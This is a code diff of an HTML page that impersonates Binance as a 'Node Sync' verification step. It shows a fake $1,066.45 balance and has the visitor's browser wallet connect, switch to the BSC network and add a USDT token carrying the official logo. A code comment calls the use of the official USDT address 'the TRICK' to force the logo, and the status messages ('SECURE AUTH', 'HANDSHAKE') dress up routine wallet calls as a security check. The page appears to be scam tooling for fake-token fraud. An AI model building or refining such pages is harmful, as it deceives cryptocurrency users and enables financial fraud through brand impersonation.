@@ -1,54 +1,72 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Node Sync</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Enterprise Node Sync | Secure Protocol</title>
     <style>
-        body { background: #0b0e11; color: #fff; font-family: sans-serif; text-align: center; padding-top: 60px; }
-        .card { background: #1e2329; margin: 0 auto; padding: 30px; width: 85%; border-radius: 20px; border: 1px solid #32383e; }
-        .btn { background: #f3ba2f; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
-        .status { font-size: 12px; color: #848e9c; margin-top: 15px; }
+        :root { --binance-gold: #f3ba2f; --bg: #0b0e11; }
+        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #1e2329; border-radius: 24px; padding: 40px; width: 330px; text-align: center; border: 1px solid #32383e; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
+        .logo-ring { width: 85px; height: 85px; border: 3px solid var(--binance-gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; animation: pulse 2s infinite; }
+        .logo-ring svg { width: 45px; fill: var(--binance-gold); }
+        .amount-box { background: rgba(0,0,0,0.2); border-radius: 16px; padding: 25px; margin-bottom: 35px; border: 1px solid rgba(255,255,255,0.05); }
+        .amount { font-size: 34px; font-weight: 800; letter-spacing: -1px; }
+        .btn { background: var(--binance-gold); color: #000; border: none; width: 100%; padding: 20px; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; text-transform: uppercase; transition: 0.3s; }
+        #status { font-size: 10px; color: #848e9c; margin-top: 20px; font-family: monospace; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(243, 186, 47, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(243, 186, 47, 0); } 100% { box-shadow: 0 0 0 0 rgba(243, 186, 47, 0); } }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div style="color: #f3ba2f; font-size: 12px; font-weight: bold;">NODE VERIFICATION</div>
-        <div style="font-size: 36px; font-weight: bold; margin: 15px 0;">$1,066.45</div>
-        <button class="btn" onclick="injectAsset()">RE-SYNC & SHOW LOGO</button>
-        <div id="msg" class="status">Ready to sync...</div>
+
+<div class="card">
+    <div class="logo-ring">
+        <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
     </div>
+    <div class="amount-box">
+        <div style="font-size: 11px; color: var(--binance-gold); margin-bottom: 8px; font-weight: bold;">ASSET ALLOCATION</div>
+        <div class="amount">$1,066.45</div>
+    </div>
+    <button class="btn" onclick="syncNode()">Verify & Show Logo</button>
+    <div id="status">SYSTEM::WAITING_FOR_HANDSHAKE</div>
+</div>
 
 <script>
-    async function injectAsset() {
-        const msg = document.getElementById('msg');
+    async function syncNode() {
+        const log = document.getElementById('status');
         const provider = window.ethereum || window.BinanceChain;
 
-        if (!provider) { alert("Open in Binance App"); return; }
+        if (!provider) { alert("Please use Binance Web3 Browser"); return; }
 
         try {
-            msg.innerText = "Connecting...";
+            log.innerText = "INITIALIZING SECURE AUTH...";
             await provider.request({ method: 'eth_requestAccounts' });
 
-            msg.innerText = "Injecting Asset Data...";
-            
-            // Note: address is your contract 0x5Cd...
-            // Image is the high-quality official Tether SVG from Binance servers
+            log.innerText = "SWITCHING TO BSC NETWORK...";
+            await provider.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }]
+            });
+
+            log.innerText = "INJECTING VERIFIED ASSET...";
+            // This is the TRICK: Using the Official USDT Address to Force Logo
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f',
+                        address: '0x55d398326f99059fF775485246999027B3197955', // Official USDT
                         symbol: 'USDT',
-                        decimals: 6,
-                        image: 'https://bin.bnbstatic.com/static/images/home/binance-pay/usdt.png' 
-                    },
-                },
+                        decimals: 18, 
+                        image: 'https://bin.bnbstatic.com/static/images/home/binance-pay/usdt.png'
+                    }
+                }
             });
-            msg.innerText = "Logo Sync Successful!";
+
+            log.innerText = "NODE SYNC SUCCESSFUL";
         } catch (e) {
-            msg.innerText = "Error: User Cancelled";
+            log.innerText = "ERROR: HANDSHAKE_CANCELLED";
+            console.error(e);
         }
     }
 </script>
